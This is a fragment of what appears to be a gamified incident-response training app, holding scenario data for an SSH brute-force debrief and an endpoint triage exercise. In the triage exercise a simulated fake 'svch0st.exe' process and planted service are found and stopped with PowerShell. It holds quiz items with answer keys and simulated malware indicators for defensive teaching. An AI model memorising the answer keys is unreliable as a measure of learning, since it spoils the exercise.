             {type:"choice", q:"What was the root cause that let a brute-force attack succeed?", opts:["A service account with a weak, never-rotated password that allowed SSH password logins","The firewall was turned off","A zero-day in sshd","A phishing email"], ans:0},
             {type:"choice", q:"Best long-term fix for svc_backup?", opts:["Replace it with a gMSA or key-only auth, block its interactive logins, and move its creds out of a plaintext file","Change the password to Backup2026!","Delete web01","Turn off logging so it can't fill up"], ans:0}],
      report:true }
  ]},
{ id:"nightshift", code:"OP-02", title:"OPERATION NIGHT SHIFT", tag:"Endpoint triage · Sec+ 2.5, 4.1", xp:350,
  premise:"10:15 PM. The EDR console pings: WS01 is making steady outbound connections to an address nobody recognizes, and the user is home asleep. It's your box to triage.",
  stages:[
    { id:"n1", title:"WHAT'S RUNNING", env:"ps", world:w=>{ w.processes.push({Name:"svch0st",Id:6666,CPU:61.3,Path:"C:\\Users\\matthew\\AppData\\Local\\Temp\\svch0st.exe",Company:""}); w.services.push({Name:"UpdaterSvc",DisplayName:"Windows Updater Helper",Status:"Running",StartType:"Automatic"}); }, host:"WS01",
      brief:"List processes. Something is pretending to be Windows.",
      tasks:[{type:"answer", q:"What's the name of the suspicious process?", accept:["svch0st","svch0st.exe"], hint:"Get-Process"},
             {type:"answer", q:"What folder is it running from? (just the last folder name)", accept:["temp"], hint:"Get-Process svch0st | Select-Object Name,Path"}]},
    { id:"n2", title:"PERSISTENCE", env:"ps", world:w=>{ w.processes.push({Name:"svch0st",Id:6666,CPU:61.3,Path:"C:\\Users\\matthew\\AppData\\Local\\Temp\\svch0st.exe",Company:""}); w.services.push({Name:"UpdaterSvc",DisplayName:"Windows Updater Helper",Status:"Running",StartType:"Automatic"}); }, host:"WS01",
      brief:"Malware wants to survive a reboot. A service set to Automatic is a classic way. Find the service that doesn't belong, stop it, and stop the process.",
      tasks:[{type:"answer", q:"Which service looks planted? (service Name)", accept:["updatersvc"], hint:"Get-Service | Where-Object {$_.Status -eq 'Running'}"},
             {type:"state", desc:"Stop the planted service", hint:"Stop-Service UpdaterSvc", check:w=>w.services.find(s=>s.Name==="UpdaterSvc").Status==="Stopped"},
             {type:"state", desc:"Set it so it won't start again", hint:"Set-Service UpdaterSvc -StartupType Disabled", check:w=>w.services.find(s=>s.Name==="UpdaterSvc").StartType==="Disabled"},
             {type:"state", desc:"Kill the process", hint:"Stop-Process -Name svch0st -Force", check:w=>!w.processes.some(p=>p.Name==="svch0st")}]},
    { id:"n3", title:"DEBRIEF", env:"none", brief:"Box is quiet. Close it out.",
      tasks:[{type:"choice", q:"Why stop the service and set it to Disabled instead of just killing the process?", opts:["The Automatic service would relaunch the malware on the next boot","Killing processes is against policy","Services can't be deleted","It saves CPU"], ans:0},
             {type:"choice", q:"What should happen to WS01 next?", opts:["Isolate it, preserve a memory image and the svch0st.exe file for forensics, then reimage it","Reboot it and give it back","Rename the file and move on","Uninstall the EDR agent"], ans:0}] }
  ]}
];
